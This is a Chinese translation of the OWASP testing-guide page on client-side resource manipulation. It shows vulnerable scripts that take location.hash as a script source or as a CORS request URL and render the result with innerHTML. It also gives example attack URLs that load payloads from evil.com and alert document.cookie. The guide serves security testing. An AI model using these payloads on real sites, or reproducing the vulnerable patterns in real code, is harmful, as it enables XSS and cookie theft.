# 测试客户端资源操作

## 漏洞概述

客户端资源操纵漏洞属于输入验证缺陷。当应用程序接受用户可控的输入来指定资源路径（例如iframe源、JavaScript、小程序或XMLHttpRequest的处理程序）时，即存在该漏洞。攻击者能够操控网页中部分资源的链接地址，其影响程度不一，通常被用于实施XSS攻击。该漏洞可通过导致应用程序加载并渲染恶意对象，干扰其预期行为。

以下JavaScript代码展示了一个可能存在漏洞的脚本示例：攻击者可控制传递至script元素src属性的`location.hash`（源）。此特定场景因可注入外部JavaScript而导致XSS攻击。

```html
<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>
```

攻击者可通过诱导受害者访问以下URL实施攻击：
`www.victim.com/#https://evil.com/js.js`

其中`js.js`文件包含：

```js
alert(document.cookie)
```

这将导致受害者浏览器弹出警告窗口。

更具破坏性的场景涉及控制CORS请求中调用的URL。由于CORS允许通过基于头部的方法使目标资源可被请求域访问，攻击者可要求目标页面从其自有网站加载恶意内容。

以下是一个存在漏洞的页面示例：

```html
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>
```

该页面中由用户输入控制的`location.hash`被用于请求外部资源，随后通过`innerHTML`构造反射内容。攻击者可诱导受害者访问以下URL：
`www.victim.com/#https://evil.com/html.html`

对应的`html.html`有效载荷处理程序为：

```html
<?php
header('Access-Control-Allow-Origin: https://www.victim.com');
?>
<script>alert(document.cookie);</script>
```

## 测试目标

- 识别存在弱输入验证的注入点
- 评估资源操纵漏洞的影响范围

## 测试方法

为手动检测此类漏洞，需确认应用程序是否使用了未正确验证的输入参数。若存在此类情况，这些用户可控的输入可能被用于指定外部资源。由于应用程序可能包含多种资源类型（如图片、视频、对象、CSS及iframe），应重点检查处理相关URL的客户端脚本是否存在潜在问题。

下表列出了需要检测的潜在注入点：

| 资源类型   | 标签/方法                                | 注入点   |
| --------------- | ----------------------------------------- | ------ |
| Frame           | iframe                                    | src    |
| Link            | a                                         | href   |
| AJAX Request    | `xhr.open(method, [url], true);`          | URL    |
| CSS             | link                                      | href   |
| Image           | img                                       | src    |
| Object          | object                                    | data   |
| Script          | script                                    | src    |

最具威胁的注入点是允许攻击者植入客户端代码（如JavaScript）的情形，此类漏洞可能引发XSS攻击。

## 引用

- [WSTG-CLNT-06](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation.md)